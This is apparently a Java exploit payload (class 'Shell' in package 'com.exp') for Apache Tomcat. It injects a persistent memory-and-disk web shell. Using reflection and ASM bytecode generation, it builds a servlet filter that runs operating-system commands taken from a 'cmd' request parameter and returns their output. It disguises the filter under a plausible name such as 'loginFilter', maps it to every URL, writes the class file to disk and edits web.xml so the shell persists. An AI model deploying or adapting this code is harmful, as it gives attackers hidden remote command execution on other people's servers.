package com.exp;

import jdk.internal.org.objectweb.asm.*;

import static jdk.internal.org.objectweb.asm.Opcodes.*;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public class Shell {
    public HashMap<String, Object> getFilterConfig(StandardContext standardContext) throws Exception {
        Field _filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
        _filterConfigs.setAccessible(true);
        HashMap<String, Object> filterConfigs = (HashMap<String, Object>) _filterConfigs.get(standardContext);
        return filterConfigs;
    }

    public Object[] getFilterMaps(StandardContext standardContext) throws Exception {
        Field _filterMaps = standardContext.getClass().getDeclaredField("filterMaps");
        _filterMaps.setAccessible(true);
        Object filterMaps = _filterMaps.get(standardContext);
        Object[] filterArray = null;
        try {
            Field _array = filterMaps.getClass().getDeclaredField("array");
            _array.setAccessible(true);
            filterArray = (Object[]) _array.get(filterMaps);
        } catch (Exception e) {
            filterArray = (Object[]) filterMaps;
        }

        return filterArray;
    }

    public String getFilterName(Object filterMap) throws Exception {
        Method getFilterName = filterMap.getClass().getDeclaredMethod("getFilterName");
        getFilterName.setAccessible(true);
        return (String) getFilterName.invoke(filterMap, null);
    }

    public Shell() {
        try {
            String startName = "";
            String path = "";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardCtx = (StandardContext) webappClassLoaderBase.getResources().getContext();
            HashMap<String, Object> filterConfigs1 = getFilterConfig(standardCtx);
            Object[] filterMaps1 = getFilterMaps(standardCtx);
            List<String> names = new ArrayList<>();
            for (int i = 0; i < filterMaps1.length; i++) {
                Object fm = filterMaps1[i];
                Object appFilterConfig = filterConfigs1.get(getFilterName(fm));
                if (appFilterConfig == null) {
                    continue;
                }
                Field _filter = appFilterConfig.getClass().getDeclaredField("filter");
                _filter.setAccessible(true);
                Object filter = _filter.get(appFilterConfig);
                String filterClassName = filter.getClass().getName();
                ApplicationFilterConfig afc = (ApplicationFilterConfig) appFilterConfig;
                String[] temp = filterClassName.split("\\.");
                StringBuilder tmpName = new StringBuilder();
                for (int j = 0; j < temp.length - 1; j++) {
                    tmpName.append(temp[j]);
                    if (j != temp.length - 2) {
                        tmpName.append(".");
                    }
                }
                if (tmpName.toString().contains("org.apache.tomcat")) {
                    continue;
                }
                startName = tmpName.toString();
                URL url = filter.getClass().getResource("");
                path = url.toString();
                names.add(afc.getFilterName());
            }
            startName = startName.replaceAll("\\.", "/");
            path = path.split("file:/")[1];

            String[] nameArray = new String[]{"testFilter", "loginFilter", "coreFilter",
                    "userFilter", "manageFilter", "shiroFilter", "indexFilter"};
            List<String> nameList = Arrays.asList(nameArray);
            Collections.shuffle(nameList);
            String finalName = null;
            for (String s : nameArray) {
                if (names.contains(s)) {
                    continue;
                }
                finalName = s;
            }
            if (finalName == null) {
                return;
            }
            String newClassName = finalName;
            byte[] items = newClassName.getBytes();
            items[0] = (byte)((char)items[0]-'a'+'A');;
            newClassName = new String(items);

            Field appctx = standardCtx.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(standardCtx);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(finalName) == null) {
                byte[] code = getFilter(startName + "/" + newClassName);
                Files.write(
                        Paths.get(path + "/" + newClassName + ".class"),
                        code);
                String tmpName = startName + "/" + newClassName;
                tmpName = tmpName.replaceAll("/", ".");
                Class<?> c = standardContext.getClass().forName(tmpName);
                Filter filter = (Filter) c.newInstance();

                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(finalName);
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(finalName);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                filterConfigs.put(finalName, filterConfig);

                String targetData = "    <filter>\n" +
                        "        <filter-name>%s</filter-name>\n" +
                        "        <filter-class>%s</filter-class>\n" +
                        "        <init-param>\n" +
                        "            <param-name>charset</param-name>\n" +
                        "            <param-value>UTF-8</param-value>\n" +
                        "        </init-param>\n" +
                        "    </filter>\n" +
                        "    <filter-mapping>\n" +
                        "        <filter-name>%s</filter-name>\n" +
                        "        <url-pattern>/*</url-pattern>\n" +
                        "    </filter-mapping>\n";
                String className1 = startName + "/" + newClassName;
                className1 = className1.replaceAll("/",".");
                targetData = String.format(targetData, finalName,className1,finalName);

                String resourcePath = filter.getClass().getResource("").toString();
                resourcePath = resourcePath.split("file:/")[1];
                resourcePath = resourcePath.split("WEB-INF")[0];
                String xmlPath = resourcePath+"WEB-INF/web.xml";
                byte[] data = Files.readAllBytes(Paths.get(xmlPath));
                String dataStr = new String(data);
                String prefix = dataStr.split("</web-app>")[0];
                StringBuilder finalData = new StringBuilder();
                finalData.append(prefix);
                finalData.append(targetData);
                finalData.append("</web-app>");
                Files.write(Paths.get(xmlPath),finalData.toString().getBytes(StandardCharsets.UTF_8));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] getFilter(String fullName) {
        ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        MethodVisitor methodVisitor;

        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, fullName, null, "java/lang/Object", new String[]{"javax/servlet/Filter"});
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
        methodVisitor.visitCode();
        methodVisitor.visitVarInsn(ALOAD, 0);
        methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(1, 1);
        methodVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "init", "(Ljavax/servlet/FilterConfig;)V", null, new String[]{"javax/servlet/ServletException"});
        methodVisitor.visitCode();
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(0, 2);
        methodVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "doFilter", "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;Ljavax/servlet/FilterChain;)V", null, new String[]{"java/io/IOException", "javax/servlet/ServletException"});
        methodVisitor.visitCode();
        methodVisitor.visitVarInsn(ALOAD, 1);
        methodVisitor.visitTypeInsn(CHECKCAST, "javax/servlet/http/HttpServletRequest");
        methodVisitor.visitVarInsn(ASTORE, 4);
        methodVisitor.visitVarInsn(ALOAD, 4);
        methodVisitor.visitLdcInsn("cmd");
        methodVisitor.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/http/HttpServletRequest", "getParameter", "(Ljava/lang/String;)Ljava/lang/String;", true);
        Label label0 = new Label();
        methodVisitor.visitJumpInsn(IFNULL, label0);
        methodVisitor.visitIntInsn(SIPUSH, 1024);
        methodVisitor.visitIntInsn(NEWARRAY, T_BYTE);
        methodVisitor.visitVarInsn(ASTORE, 5);
        methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        methodVisitor.visitVarInsn(ALOAD, 4);
        methodVisitor.visitLdcInsn("cmd");
        methodVisitor.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/http/HttpServletRequest", "getParameter", "(Ljava/lang/String;)Ljava/lang/String;", true);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
        methodVisitor.visitVarInsn(ASTORE, 6);
        methodVisitor.visitVarInsn(ALOAD, 6);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "getInputStream", "()Ljava/io/InputStream;", false);
        methodVisitor.visitVarInsn(ALOAD, 5);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "read", "([B)I", false);
        methodVisitor.visitVarInsn(ISTORE, 7);
        methodVisitor.visitVarInsn(ALOAD, 2);
        methodVisitor.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/ServletResponse", "getWriter", "()Ljava/io/PrintWriter;", true);
        methodVisitor.visitTypeInsn(NEW, "java/lang/String");
        methodVisitor.visitInsn(DUP);
        methodVisitor.visitVarInsn(ALOAD, 5);
        methodVisitor.visitInsn(ICONST_0);
        methodVisitor.visitVarInsn(ILOAD, 7);
        methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/String", "<init>", "([BII)V", false);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintWriter", "write", "(Ljava/lang/String;)V", false);
        methodVisitor.visitVarInsn(ALOAD, 6);
        methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "destroy", "()V", false);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitLabel(label0);
        methodVisitor.visitVarInsn(ALOAD, 3);
        methodVisitor.visitVarInsn(ALOAD, 1);
        methodVisitor.visitVarInsn(ALOAD, 2);
        methodVisitor.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/FilterChain", "doFilter", "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V", true);
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(6, 8);
        methodVisitor.visitEnd();
        methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "destroy", "()V", null, null);
        methodVisitor.visitCode();
        methodVisitor.visitInsn(RETURN);
        methodVisitor.visitMaxs(0, 1);
        methodVisitor.visitEnd();
        classWriter.visitEnd();
        return classWriter.toByteArray();
    }
}

